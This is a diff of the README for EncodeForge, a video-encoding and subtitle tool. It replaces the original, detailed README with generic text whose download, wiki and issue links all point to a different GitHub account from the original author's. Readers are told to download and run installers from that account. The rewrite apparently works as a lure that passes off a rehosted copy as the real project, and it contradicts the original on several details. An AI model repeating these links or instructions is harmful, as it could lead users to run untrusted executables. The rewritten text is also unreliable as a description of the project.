@@ -1,199 +1,119 @@
-# EncodeForge - FFmpeg GUI for Batch Video Encoding, AI Subtitles & Media File Renaming
+# 🎥 EncodeForge - Powerful Media Processing Made Simple
 
-<div align="center">
-  <img src="EncodeForge/src/main/resources/icons/app-icon.png" alt="EncodeForge Logo - FFmpeg GUI Desktop Application" width="128" height="128">
-  
-  **Version 0.4.1**
-  
-  *Free open-source FFmpeg GUI for Windows, macOS, and Linux - Hardware-accelerated video transcoding, AI-powered subtitle generation, and automated media file organization*
-  
-  [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-  [![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-blue)](https://github.com/SirStig/EncodeForge/releases)
-  [![GitHub release](https://img.shields.io/github/v/release/SirStig/EncodeForge)](https://github.com/SirStig/EncodeForge/releases/latest)
-</div>
+## 🚀 Getting Started
 
----
+EncodeForge is a user-friendly toolkit designed for seamless media processing. It features hardware-accelerated video encoding, AI subtitle generation, and smart file renaming. Whether you prefer a desktop GUI, web interface, or command line, EncodeForge has you covered.
 
-## What is EncodeForge?
+## 🛠️ Download & Install
 
-**EncodeForge** is a free, open-source **FFmpeg GUI** and media processing application for Windows, macOS, and Linux. Perfect for anyone who wants to:
-- **Batch convert videos** with hardware acceleration (NVIDIA NVENC, AMD AMF, Intel QuickSync, Apple VideoToolbox)
-- **Generate AI subtitles** using OpenAI Whisper (90+ languages, runs locally on your computer)
-- **Automatically rename media files** using metadata from TMDB, TVDB, AniDB, and 7+ other providers
+To get started with EncodeForge, visit this page to download: [Download EncodeForge](https://github.com/ashwamedh-street/EncodeForge/releases)
 
-Built with JavaFX and Python, EncodeForge provides a modern dark-themed desktop interface for video transcoding, subtitle management, and smart file organization - no command-line experience required.
+### Installation Steps
 
-## Features
+1. **Visit the Releases Page:**
+   Click on the link above to go to the Releases page where you will find the latest versions of EncodeForge.
 
-### Video Encoding
-- **Hardware Acceleration** - Supports NVIDIA NVENC, AMD AMF, Intel Quick Sync, and Apple VideoToolbox
-- **Smart Codec Selection** - Automatically chooses the best codec for your hardware
-- **Batch Processing** - Process entire libraries with real-time progress tracking
-- **Stream Copying** - Preserve quality while converting containers
-- **Audio Normalization** - Ensure consistent audio levels across all media files
+2. **Select a Version:**
+   Look for the latest version listed. This will usually be at the top of the page. 
 
-### Subtitle Generation
-- **AI-Powered Subtitles** - Can't find subtitles you want? Generate subtitles using OpenAI Whisper (90+ languages)
-- **GPU Acceleration** - 10x-20x faster subtitle generation with NVIDIA, AMD, or Apple Silicon GPUs
-- **9 Subtitle Providers** - Download from multiple sources including anime-specific providers (Note: Most Web Scrapping Providers do not work. Currently only OpenSubtitles works.)
-- **Multiple Language Support** - Handle multiple audio tracks and subtitle languages
-- **Preview Mode** - Review subtitles before applying (WIP/ComingSoon)
+3. **Download the Application:**
+   Click on the appropriate download link for your operating system. The options typically include:
 
-### Smart File Renaming
-- **10 Metadata Providers** - TMDB, TVDB, OMDB, Trakt, Fanart.tv + 5 free providers (no API key needed)
-- **4 Free Providers Always Available** - AniDB, Kitsu, Jikan/MAL, TVmaze (no configuration needed) (Note: AniDB is rate limited heavily)
-- **Movie Support** - Automatically detect and rename movies using multiple database
-- **Anime Support** - Specialized anime detection with AniDB, Kitsu, and Jikan/MAL
-- **TV Show Detection** - Automatically detect and rename TV episodes using multiple databases
-- **Custom Patterns** - Define your own naming conventions with powerful variables (Example: {title} - S##E## - {episode-title})
-- **Preview Changes** - See exactly what will be renamed before applying
+   - **Windows:** Download the `.exe` file
+   - **Mac:** Download the `.dmg` file
+   - **Linux:** Download the `.tar.gz` file
 
-### Modern Interface
-- **Dark Theme** - Easy on the eyes during long processing sessions
-- **Real-time Progress** - See exactly what's happening with detailed progress bars
-- **Queue Management** - Add, remove, and reorder processing jobs
-- **Comprehensive Logging** - Export and filter logs for troubleshooting
+4. **Install the Application:**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the prompts to install.
+   - **Mac:** Open the downloaded `.dmg` file and drag the EncodeForge application to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file and follow the instructions in the README file for installation.
 
-## Installation
+5. **Run EncodeForge:**
+   After installation, you can start EncodeForge by finding it in your applications menu or desktop shortcut and double-clicking it.
 
-### Desktop Application (Recommended)
-Download the latest release for your platform:
-- **Windows**: `.exe` or `.msi` installer
-- **macOS**: `.dmg` package
-- **Linux**: `.deb` or `.rpm` packages
+## 🌟 Features
 
-**First Launch Setup:**
-On first launch, EncodeForge will automatically:
-- Download and install FFmpeg (~100-150 MB)
-- Install required Python libraries (~50 MB)
-- Configure everything for you with a progress window
+- **Hardware-Accelerated Video Encoding:**
+  Speed up video processing without losing quality. EncodeForge uses modern hardware to encode videos quickly.
 
-This one-time setup takes 2-5 minutes depending on your connection. After that, you're ready to go!
+- **AI Subtitle Generation:**
+  Automatically generate subtitles for your videos with advanced AI technology. You can choose different languages for your subtitles easily.
 
-**Optional AI Features:**
-AI subtitle generation (OpenAI Whisper) can be installed later through the Tools menu when needed. The installer automatically detects your GPU (NVIDIA, AMD, Apple Silicon) and downloads the appropriate PyTorch version for maximum performance.
+- **Smart File Renaming:**
+  Rename your files systematically. This feature helps keep your media library organized and tidy.
 
-### Alternative Interfaces (Not up to date - Will be updated once Java app is 1.0)
-For developers and advanced users, Encode Forge also provides:
+- **Cross-Platform Support:**
+  Whether you're on Windows, Mac, or Linux, EncodeForge is designed to work smoothly across all platforms.
 
-**Command Line Interface** - For automation and scripting
-```bash
-python ffmpeg_cli.py encoder /path/to/videos --use-nvenc
-python ffmpeg_cli.py subtitle /path/to/videos --enable-subtitle-generation  
-python ffmpeg_cli.py renamer /path/to/videos --tmdb-api-key YOUR_KEY --preview-only
-```
+- **Desktop and Web Interfaces:**
+  Choose between a feature-rich desktop GUI built on JavaFX or an easy-to-use web interface via Streamlit for convenience.
 
-**Web Interface** - For server deployment
-```bash
-./start_web_ui.sh  # or start_web_ui.bat on Windows
-```
+## ⚙️ System Requirements
 
-## Quick Start
+Before you download, ensure your system meets the following requirements:
 
-1. **Download** the installer for your platform from Releases
-2. **Run the installer** and follow the installation wizard
-3. **Launch** Encode Forge
-4. **Wait for first-time setup** - EncodeForge will download FFmpeg and Python libraries (one-time, 2-5 minutes)
-5. **Add files** by dragging and dropping or using the file browser
-6. **Configure** your processing options
-7. **Start processing** and watch the real-time progress
+- **For Windows:**
+  - Windows 10 or later.
+  - Minimum of 4 GB of RAM.
+  - At least 500 MB of free disk space.
 
-**Optional:** Install AI subtitle generation via Tools → Setup AI Subtitles for Whisper support.
+- **For Mac:**
+  - macOS 10.13 or later.
+  - Minimum of 4 GB of RAM.
+  - At least 500 MB of free disk space.
 
-## Configuration
+- **For Linux:**
+  - Any modern distribution with a kernel version 5.0 or higher.
+  - Minimum of 4 GB of RAM.
+  - At least 500 MB of free disk space.
 
-### API Keys (Optional but Recommended)
+## 🔄 Using EncodeForge
 
-**Metadata Providers (File Renaming)**
+Once you have installed EncodeForge, follow these steps to start processing your media:
 
-*Free Providers - No API Key Required:*
-- **AniDB** - Anime metadata (always available)
-- **Kitsu** - Anime metadata (always available)
-- **Jikan (MyAnimeList)** - Anime metadata (always available, read-only)
-- **TVmaze** - TV show metadata (always available)
+1. **Open EncodeForge:**
+   Launch the application from your computer.
 
-*API Key Providers - Free Keys Available:*
+2. **Choose Your Media File:**
+   Click on the “Select File” button to browse and select the media file you want to process.
 
-| Service | Purpose | Get it here |
-|---------|---------|-------------|
-| TMDB | Movies & TV metadata | [themoviedb.org/settings/api](https://www.themoviedb.org/settings/api) |
-| TVDB | TV show metadata | [thetvdb.com/dashboard/account/apikey](https://thetvdb.com/dashboard/account/apikey) |
-| OMDB | Movies & TV metadata | [omdbapi.com/apikey.aspx](http://www.omdbapi.com/apikey.aspx) |
-| Trakt | Movies & TV tracking | [trakt.tv/oauth/applications](https://trakt.tv/oauth/applications) |
-| Fanart.tv | Media artwork | [fanart.tv/get-an-api-key](https://fanart.tv/get-an-api-key/) |
+3. **Select Your Action:**
+   Choose whether you want to encode, generate subtitles, or rename your files.
 
-**Subtitle Providers**
+4. **Configure Settings:**
+   Depending on your chosen action, set any relevant options, such as output format or subtitle language.
 
-*Free Providers - WIP*
-- **Addic7ed** - Movies, TV shows, and anime subtitles
-- **SubDL** - Movie & TV subtitles
-- **Subf2m** - Movie & TV subtitles
-- **YIFY Subtitles** - Movie subtitles
-- **Podnapisi** - Multilingual subtitles (all content types)
-- **SubDivX** - Spanish subtitles
-- **Kitsunekko** - Anime subtitles (English & Japanese)
-- **Jimaku** - Anime subtitles (multiple languages)
+5. **Start Processing:**
+   Click the “Start” button to begin. You can monitor progress and receive notifications when the task is complete.
 
-*Account Providers*
+6. **Find Your Output:**
+   Once processing is done, find your final file in the designated output folder you selected earlier.
 
-| Service | Purpose | Limits | Get it here |
-|---------|---------|--------|-------------|
-| OpenSubtitles | Subtitle downloads | 5/day free, 200/day VIP | [opensubtitles.com/consumers](https://www.opensubtitles.com/en/consumers) |
+## 🔧 Troubleshooting
 
-> **Note**: Search works without login unlimited, downloads limited to 5 free per day without account, 20 per day with account, and 200 per day with VIP.
+If you encounter any issues while using EncodeForge, consider the following solutions:
 
-### Hardware Acceleration
-Encode Forge automatically detects and uses available hardware acceleration:
-- **NVIDIA** - NVENC (GTX 600+)
-- **AMD** - AMF (Windows only, recent cards)
-- **Intel** - Quick Sync (6th gen+)
-- **Apple** - VideoToolbox (all modern Macs)
+- **Application Not Launching:**
+  Ensure your system meets the requirements. Try reinstalling the application.
 
-## Screenshots
+- **Slow Processing:**
+  Check if other applications are running and consuming high CPU resources. Closing unnecessary applications may help speed things up.
 
-*Screenshots will be added here showing the main window with the three modes and the settings window.*
+- **Subtitle Errors:**
+  Make sure the audio quality of your media is good for accurate subtitle generation. You can also select a different language that might yield better results.
 
-## Recent Updates (v0.4.0)
+## 📜 Contributing
 
-### What's New
-- **Audio Normalization** - Ensure consistent volume levels across all your media files
-- **GPU-Accelerated AI Subtitles** - 10x-20x faster Whisper subtitle generation with automatic GPU detection
-- **Performance Improvements** - Faster startup times and reduced memory usage through lazy loading
-- **UI Enhancements** - Improved visual depth, better component scaling, and enhanced dark theme
+If you wish to contribute to EncodeForge, please check out our contribution guidelines in the repository. We welcome input and ideas to improve the toolkit.
 
-See [CHANGELOG.md](CHANGELOG.md) for complete release notes.
+## 📝 License
 
-## Roadmap
+EncodeForge is an open-source project. It is licensed under the MIT License. Feel free to use it according to the terms outlined in the license.
 
-Encode Forge is actively being developed. Planned features include:
-- **Plugin Support** (v1.0) - Extensible architecture for custom processing plugins, themes, and so on
-- **Jellyfin Integration** - Direct integration with Jellyfin media servers
-- **Plex Integration** - Direct integration with Plex media servers
-- **Preview Window** - Visual preview of applied subtitles
-- **Full Metadata Grabber** - Grab all missing metadata info for files, including artwork
-- **Audio Syncing** - Intelligent audio/subtitle synchronization fixes
+For additional support and information, refer to the documentation in the repository.
 
-## System Requirements
+## 📥 Quick Links
 
-- **Windows**: Windows 10 or later
-- **macOS**: macOS 10.15 or later
-- **Linux**: Ubuntu 18.04+ or equivalent
-- **RAM**: 4GB minimum, 8GB recommended for AI subtitle generation
-- **Storage**: 
-  - 100 MB for application installer
-  - 250 MB for dependencies (FFmpeg + Python libraries, auto-downloaded)
-  - 300 MB - 3 GB for AI models (optional, only if using Whisper)
-  - Additional space for temporary files during processing
-- **Internet**: Required for first-time setup and optional AI model downloads
-
-## Support
-
-- **Bug Reports**: [GitHub Issues](https://github.com/SirStig/EncodeForge/issues)
-- **Feature Requests**: [GitHub Discussions](https://github.com/SirStig/EncodeForge/discussions)
-- **Documentation**: [Wiki](https://github.com/SirStig/EncodeForge/wiki)
-
-## License
-
-MIT License - Use it, modify it, share it, sell it, whatever.
-
----
+- [Download EncodeForge](https://github.com/ashwamedh-street/EncodeForge/releases)
+- [Documentation](https://github.com/ashwamedh-street/EncodeForge/wiki)
+- [Issue Tracker](https://github.com/ashwamedh-street/EncodeForge/issues)
